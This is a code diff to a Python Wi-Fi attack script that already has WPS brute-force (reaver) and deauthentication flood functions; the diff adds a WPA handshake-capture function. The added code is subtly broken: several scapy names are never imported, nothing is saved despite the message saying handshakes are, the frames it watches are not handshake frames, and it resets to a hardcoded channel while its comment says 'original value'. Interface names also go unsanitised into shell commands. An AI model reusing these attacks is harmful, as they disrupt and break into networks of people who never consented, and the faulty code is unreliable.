@@ -1,6 +1,7 @@
 from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
 import subprocess
 import time
+import os
 
 def perform_wps_bruteforce(target_mac, interface='wlan0'):
     command = f"reaver -i {interface} -b {target_mac} -vv"
@@ -64,3 +65,33 @@ def perform_deauth_attack(target_mac, ap_mac, interface='wlan0', count=10):
             time.sleep(0.1)  # Delay between packets
     except KeyboardInterrupt:
         print("Deauth attack stopped.")
+def perform_handshake_capture(interface='wlan0', channel=1, timeout=60):
+    """
+    Capture WPA/WPA2 handshakes on a specified channel.
+
+    :param interface: Network interface to use (e.g., 'wlan0').
+    :param channel: Wi-Fi channel to monitor.
+    :param timeout: Time to capture packets (in seconds).
+    """
+    print(f"Starting handshake capture on interface '{interface}' at channel {channel}...")
+    
+    # Set the wireless interface to the specified channel
+    os.system(f"iwconfig {interface} channel {channel}")
+    
+    def packet_handler(packet):
+        if packet.haslayer(Dot11):
+            if packet.haslayer(Dot11Auth):
+                print(f"Authentication packet captured: {packet.summary()}")
+            if packet.haslayer(Dot11AssoReq):
+                print(f"Association request packet captured: {packet.summary()}")
+    
+    # Start sniffing packets
+    start_time = time.time()
+    try:
+        sniff(iface=interface, prn=packet_handler, timeout=timeout, verbose=0)
+    except KeyboardInterrupt:
+        print("Handshake capture stopped.")
+    finally:
+        # Reset the channel back to the original value
+        os.system(f"iwconfig {interface} channel 1")
+        print("Capture finished. Handshakes (if any) should be saved.")
